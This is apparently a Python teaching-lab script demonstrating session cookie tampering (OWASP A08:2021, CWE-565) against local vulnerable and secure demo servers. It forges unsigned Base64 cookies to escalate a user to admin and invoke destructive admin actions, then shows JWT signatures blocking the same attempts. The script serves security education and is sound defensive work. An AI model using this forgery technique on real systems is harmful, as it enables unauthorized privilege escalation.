#!/usr/bin/env python3
"""
A08:2021 - Session Cookie Tampering
CWE-565: Reliance on Cookies without Validation or Integrity Checking

攻擊原理：
1. 漏洞版本使用 Base64 編碼的 Cookie 儲存會話資料
2. Cookie 沒有簽名，攻擊者可以直接修改內容
3. 安全版本使用 JWT 簽名，確保 Cookie 未被竄改
"""

import requests
import json
import base64
import sys

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def encode_session(data: dict) -> str:
    """Base64 編碼會話資料"""
    json_str = json.dumps(data)
    return base64.b64encode(json_str.encode()).decode()


def decode_session(encoded: str) -> dict:
    """Base64 解碼會話資料"""
    json_str = base64.b64decode(encoded).decode()
    return json.loads(json_str)


def demo_session_tampering_vulnerable():
    """
    對漏洞版本進行 Session Cookie 竄改
    """
    print("\n" + "="*60)
    print("漏洞版本 - Session Cookie 竄改 (CWE-565)")
    print("="*60)
    
    # 建立正常的 session
    print("\n[1] 建立正常使用者 session...")
    normal_session = {
        "username": "normal_user",
        "userId": 2,
        "role": "user",
        "email": "user@example.com"
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/session/create",
        json=normal_session,
        timeout=10
    )
    print_response(response)
    
    # 取得 cookie
    session_cookie = None
    for cookie in response.cookies:
        if cookie.name == "user_session":
            session_cookie = cookie.value
            break
    
    if session_cookie:
        print(f"\n[*] 取得 Session Cookie: {session_cookie[:50]}...")
        
        # 解碼 cookie
        decoded = decode_session(session_cookie)
        print(f"[*] 解碼後的內容:")
        print(json.dumps(decoded, indent=2))
    
    # 驗證正常 session
    print("\n[2] 驗證正常 session...")
    response = requests.get(
        f"{VULNERABLE_URL}/api/integrity/session/validate",
        cookies={"user_session": session_cookie},
        timeout=10
    )
    print_response(response)
    
    # 竄改 session：將 role 改為 admin
    print("\n[3] 竄改 session：將 role 改為 admin...")
    tampered_session = {
        "username": "normal_user",
        "userId": 2,
        "role": "admin",  # 改為 admin！
        "email": "user@example.com"
    }
    tampered_cookie = encode_session(tampered_session)
    print(f"[*] 竄改後的 Cookie: {tampered_cookie[:50]}...")
    
    response = requests.get(
        f"{VULNERABLE_URL}/api/integrity/session/validate",
        cookies={"user_session": tampered_cookie},
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        if data.get("isAdmin"):
            print("\n[+] ✓ 提權成功！現在是 admin！")
    
    # 使用竄改的 session 執行管理員操作
    print("\n[4] 使用竄改的 session 執行管理員操作...")
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/session/admin-action",
        json={"action": "delete_all_users"},
        cookies={"user_session": tampered_cookie},
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        print("\n[+] ✓ 管理員操作成功！")
        print("[!] 普通使用者成功執行了管理員操作！")
    
    # 完全偽造一個 admin session
    print("\n[5] 完全偽造 admin session...")
    forged_session = {
        "username": "super_admin",
        "userId": 999,
        "role": "admin",
        "email": "admin@internal.com",
        "permissions": ["ALL"]
    }
    forged_cookie = encode_session(forged_session)
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/session/admin-action",
        json={"action": "system_shutdown"},
        cookies={"user_session": forged_cookie},
        timeout=10
    )
    print_response(response)


def demo_session_tampering_secure():
    """
    對安全版本進行 Session Cookie 竄改（應該失敗）
    """
    print("\n" + "="*60)
    print("安全版本 - JWT 簽名驗證")
    print("="*60)
    
    # 建立正常的 session
    print("\n[1] 建立正常使用者 session（JWT 簽名）...")
    normal_session = {
        "username": "normal_user",
        "userId": 2,
        "role": "user"
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/session/create",
        json=normal_session,
        timeout=10
    )
    print_response(response)
    
    # 取得 cookie（這是 JWT）
    session_cookie = None
    for cookie in response.cookies:
        if cookie.name == "user_session":
            session_cookie = cookie.value
            break
    
    if session_cookie:
        print(f"\n[*] 取得 JWT Session Cookie: {session_cookie[:60]}...")
        
        # JWT 結構：header.payload.signature
        parts = session_cookie.split(".")
        if len(parts) == 3:
            print(f"[*] JWT 結構:")
            print(f"    Header: {parts[0][:30]}...")
            print(f"    Payload: {parts[1][:30]}...")
            print(f"    Signature: {parts[2][:30]}...")
    
    # 驗證正常 session
    print("\n[2] 驗證正常 session...")
    response = requests.get(
        f"{SECURE_URL}/api/integrity/session/validate",
        cookies={"user_session": session_cookie},
        timeout=10
    )
    print_response(response)
    
    # 嘗試竄改 JWT payload
    print("\n[3] 嘗試竄改 JWT（修改 payload 中的 role）...")
    
    if session_cookie and "." in session_cookie:
        parts = session_cookie.split(".")
        
        # 解碼 payload
        # 加入 padding
        payload_b64 = parts[1]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding
        
        try:
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            print(f"[*] 原始 payload: {payload}")
            
            # 修改 role
            payload["role"] = "admin"
            print(f"[*] 竄改後 payload: {payload}")
            
            # 重新編碼（但保留原始簽名）
            new_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip("=")
            
            tampered_jwt = f"{parts[0]}.{new_payload_b64}.{parts[2]}"
            
            print(f"[*] 竄改後的 JWT: {tampered_jwt[:60]}...")
            
            # 嘗試使用竄改的 JWT
            response = requests.get(
                f"{SECURE_URL}/api/integrity/session/validate",
                cookies={"user_session": tampered_jwt},
                timeout=10
            )
            print_response(response)
            
            if response.status_code == 401:
                print("\n[+] ✓ 竄改的 JWT 被拒絕！")
                print("[*] JWT 簽名驗證成功阻止了攻擊")
                
        except Exception as e:
            print(f"[!] 解碼失敗: {e}")
    
    # 嘗試完全偽造 JWT（沒有正確的金鑰）
    print("\n[4] 嘗試完全偽造 JWT...")
    
    # 建立偽造的 JWT（使用錯誤的金鑰）
    forged_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
    ).decode().rstrip("=")
    
    forged_payload = base64.urlsafe_b64encode(
        json.dumps({
            "username": "hacker",
            "userId": 999,
            "role": "admin"
        }).encode()
    ).decode().rstrip("=")
    
    # 使用假簽名
    fake_signature = "fake_signature_that_wont_verify"
    
    forged_jwt = f"{forged_header}.{forged_payload}.{fake_signature}"
    
    response = requests.get(
        f"{SECURE_URL}/api/integrity/session/validate",
        cookies={"user_session": forged_jwt},
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 401:
        print("\n[+] ✓ 偽造的 JWT 被拒絕！")
        print("[*] 沒有正確的簽名金鑰，無法偽造有效的 JWT")
    
    # 嘗試執行管理員操作
    print("\n[5] 嘗試用偽造的 JWT 執行管理員操作...")
    response = requests.post(
        f"{SECURE_URL}/api/integrity/session/admin-action",
        json={"action": "delete_all_users"},
        cookies={"user_session": forged_jwt},
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 401:
        print("\n[+] ✓ 管理員操作被阻止！")


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A08:2021 - Session Cookie Tampering                         ║
║  CWE-565: Reliance on Cookies without Integrity Checking     ║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：修改 Base64 編碼的 Session Cookie                 ║
║  防禦方式：使用 JWT 簽名確保 Cookie 完整性                   ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_session_tampering_vulnerable()
        elif target == "secure":
            demo_session_tampering_secure()
        elif target == "both":
            demo_session_tampering_vulnerable()
            demo_session_tampering_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|both]")
    else:
        demo_session_tampering_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_session_tampering_secure()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
